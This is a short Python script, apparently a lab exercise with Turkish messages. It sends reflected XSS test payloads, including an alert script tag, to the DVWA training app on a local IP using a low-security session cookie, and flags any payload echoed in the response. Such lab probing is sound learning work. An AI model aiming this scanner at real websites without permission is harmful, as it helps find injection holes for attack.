import requests

header={"Cookie": "security=low;" "PHPSESSID=85ac05f05d44336c43caeff4644c981a"}#securutiy=[low,medium,high]
xss_list=["kale","<h1>kale</h1>","<script>alert('warning')</script>","<font color=blue>"]

for i in xss_list:
    url="http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name="+str(i)
    sonuc=requests.get(url=url,headers=header)

    if str(i) in sonuc.content.decode("utf_8"):
        print("XSS açığı olabilir : ",str(i))